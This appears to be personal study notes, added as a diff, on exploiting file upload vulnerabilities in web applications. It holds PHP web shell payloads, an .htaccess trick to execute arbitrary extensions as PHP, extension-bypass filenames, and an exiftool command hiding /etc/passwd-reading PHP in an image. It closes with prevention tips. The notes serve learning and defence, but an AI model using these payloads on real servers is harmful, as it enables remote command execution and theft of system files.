@@ -1,0 +1,91 @@
+FILE UPLOAD VULNERABILITY
+-------------------------
+
+* I will only  consider specific scenerios since it is not a very technical or difficult to understand vulnerability.
+
+* There are very basic some php payloads to exploit.
+
+-> <?php echo file_get_contents('/path/to/target/file'); ?>
+-> <?php echo system($_GET['command']); ?>
+
+* Generally, multipart/form-data is preferred in th HTTP post requests of file uploading functionalities.
+* It containts Content-Type header to tell which MIME type of the data was submitted using this input.
+
+
+1 - If only Content-Type header is trusted and there is no further validation, then we can easily bypass it with a proxy such as Burp Suite.
+
+2 - File execution may be prevented in some directories. Therefore, we can bypass it if there is a path traversal vulnerability.
+
+3 - Blacklisting/whitelisting of file type or extensions must not be insufficient.
+
+Examples for bypassing:
+-> .php5
+-> .shtml
+
+* Alternatively, we can override server configurations.
+* Apache servers have the configuration directories:
+	-> /etc/apache2/apache2.conf
+* This file have the following content.
+
+LoadModule php_module /usr/lib/apache2/modules/libphp.so
+    AddType application/x-httpd-php .php
+
+* Apache servers will also have another file for directory specific configuration.
+	-> .htaccess
+
+* IIS servers will have web.config file and their content will be the following.
+
+<staticContent>
+    <mimeMap fileExtension=".json" mimeType="application/json" />
+</staticContent>
+
+How do we attack using above knowledge?
+- - - - - - - - - - - - - - - - - - - -
+
+
+* We can upload our configuration file such that the MIME type we want will be executed.
+
+Example:
+-> I will upload .htaccess file named a.qwe with the following content
+
+AddType application/x-httpd-php .qwe
+
+-> If I can successfully upload it, .qwe type files will be executed as php. .qwe is just an arbitrary string.
+
+4 - File Extension Bypass Techniques
+	-> exploit.pHp
+	-> exploit.php.jpg
+	-> exploit.jpg.php
+	-> exploit.php.
+	-> exploit%2Ephp
+	-> exploit.asp;.jpg
+	-> exploit.asp%00.jpg
+	-> xC0 x2E
+	-> xC4 xAE
+	-> xC0 xAE
+	-> x2E
+	-> exploit.p.phphp
+
+5 - File Content Type musb sufficiently validated
+
+* Exiftool can be used to bypass it.
+
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+
+
+
+* There are also some various scenerios to consider.
+	-> We can upload HTML file that contains <script> tags to create stored XSS attacks.
+	-> We can try to exploit the vulnerabilities in the parsins. For instance, if we know that the server parses XML based files such as .doc or .xls files, we may try to trigger XXE via file upload.
+	-> Some web serves may be configured to support PUT requests. This can provide an alternative way to upload file.
+
+
+HOW TO PREVENT FILE UPLOAD VULNERABILITIES?
+------------------------------------------
+1- Check the file extension agains a whitelist of permitted extensions rather than a blacklist of prohibited ones.
+2- Make sure the filename does not contain any substrings that may be interpreted as a directory or a traversal squence ../
+3- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
+4- Do not upload files to the server's permanent filesystem until they have been fully validated.
+5- As much as possible, us an established framework for preprocessing file uploads rather than atempting to write your own validation mechanisms.
+
